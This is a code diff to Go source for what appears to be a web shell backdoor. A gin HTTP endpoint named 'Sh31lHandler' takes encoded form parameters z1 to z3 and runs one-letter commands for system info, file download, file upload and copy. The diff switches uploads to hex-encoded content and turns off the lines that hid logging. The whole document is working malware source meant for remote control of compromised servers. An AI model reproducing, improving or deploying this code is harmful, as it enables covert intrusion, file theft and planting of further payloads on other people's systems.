@@ -178,8 +178,9 @@ func DownloadFileCode(path string) []byte {
 	return buff
 }
 
-func UploadFileCode(path string, content []byte) string {
-	if err := os.WriteFile(path, content, 0666); err != nil {
+func UploadFileCode(path string, content string) string {
+	bs, _ := hex.DecodeString(content)
+	if err := os.WriteFile(path, bs, 0666); err != nil {
 		return "0"
 	}
 	return "1"
@@ -342,6 +343,7 @@ func Sh31lHandler(context *gin.Context) {
 	z1 := Decoder(context.PostForm("z1"))
 	z2 := Decoder(context.PostForm("z2"))
 	z3 := Decoder(context.PostForm("z3"))
+
 	switch values {
 	case "A":
 		ret = BaseInfo()
@@ -356,7 +358,7 @@ func Sh31lHandler(context *gin.Context) {
 	case "F":
 		ret = string(DownloadFileCode(z1))
 	case "U":
-		ret = UploadFileCode(z1, []byte(z2))
+		ret = UploadFileCode(z1, z2)
 	case "H":
 		ret = CopyFileOrDirCode(z1, z2)
 	case "I":
@@ -386,8 +388,8 @@ func r404(c *gin.Context) {
 }
 
 func ginserver() {
-	gin.SetMode(gin.ReleaseMode)
-	gin.DefaultWriter = io.Discard
+	//gin.SetMode(gin.ReleaseMode)
+	//gin.DefaultWriter = io.Discard
 	r := gin.Default()
 	r.NoRoute(r404)
 	r.POST("/"+API, Sh31lHandler)
